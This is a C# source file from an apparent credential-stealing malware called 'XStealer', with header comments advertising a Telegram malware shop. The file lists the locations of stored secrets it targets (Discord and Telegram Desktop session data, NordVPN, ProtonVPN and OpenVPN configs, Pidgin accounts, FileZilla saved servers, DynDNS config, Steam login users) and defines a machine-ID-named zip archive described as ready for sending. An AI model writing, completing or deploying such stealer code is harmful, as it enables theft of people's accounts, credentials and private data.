// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
    using System;
    using System.IO;
    using System.Reflection;

    public static class GlobalPaths
    {
        #region Default Windows Paths | Пути Windows по умолчанию
        public static readonly string CurrDir = Environment.CurrentDirectory;
        public static readonly string AssemblyPath = Assembly.GetExecutingAssembly().Location;
        public static readonly string GetFileName = Path.GetFileName(AppDomain.CurrentDomain.FriendlyName);
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static readonly string DocDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        public static readonly string AllUsers = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        #endregion

        /// <summary>
        /// <b><br>Метод комбинирующий пути</br></b>
        /// <b><br>Combining path method</br></b>
        /// </summary>
        /// <param name="path"><br>Путь для соединения</br><br>Connection path</br></param>
        /// <returns><br>Соединённый путь</br><br>Connected path</br></returns>
        public static string CombinePath(params string[] path)
        {
            string result;
            try
            {
                result = Path.Combine(path);
            }
            catch
            {
                result = string.Concat(path);
            }
            return result;
        }

        /// <summary>
        /// <br>Временный файл для безопасного чтения БД</br>
        /// <br>Temporary file for safe reading of the database</br>
        /// </summary>
        public static readonly string SqliteDump = CombinePath(AppData, $"{RndEx.GenText}.dat");

        public static readonly string DiscordPath = CombinePath(AppData, "discord");
        public static readonly string NordPath = CombinePath(LocalAppData, "NordVPN");
        public static readonly string ProtPath = CombinePath(LocalAppData, "ProtonVPN");
        public static readonly string OpenPath = CombinePath(UserProfile, "OpenVPN", "config");
        private static readonly string TelegramPath = CombinePath(AppData, "Telegram Desktop");
        public static readonly string TdataPath = CombinePath(TelegramPath, "tdata");

        public static readonly string PidPurple = CombinePath(AppData, ".purple", "accounts.xml");
        public static readonly string FZilla = CombinePath(AppData, "FileZilla", "recentservers.xml");
        public static readonly string DynDns = CombinePath(AllUsers, "Dyn", "Updater", "config.dyndns");

        /// <summary>
        /// Имя .zip архива
        /// </summary>
        public static readonly string ArchiveName = $"{Modules.Machine.Hwid.GetData()}_[$TAG$]";

        /// <summary>
        /// Готовый .zip архив для отправки
        /// </summary>
        public static readonly string ZipOut = $"{ArchiveName}.zip";

         public static readonly string LoginFile = CombinePath(Modules.Apps.Steam.SteamPath.GetLocationSteam(), "config", "loginusers.vdf");

        /// <summary>
        /// <br>Тестовый лог для проверки на ошибки с записью на диск</br>
        /// <br>Test log to check for errors with writing to disk</br>
        /// </summary>
        public static readonly string LogInizialize = CombinePath(AppData, "Log_Client.dat");
    }
}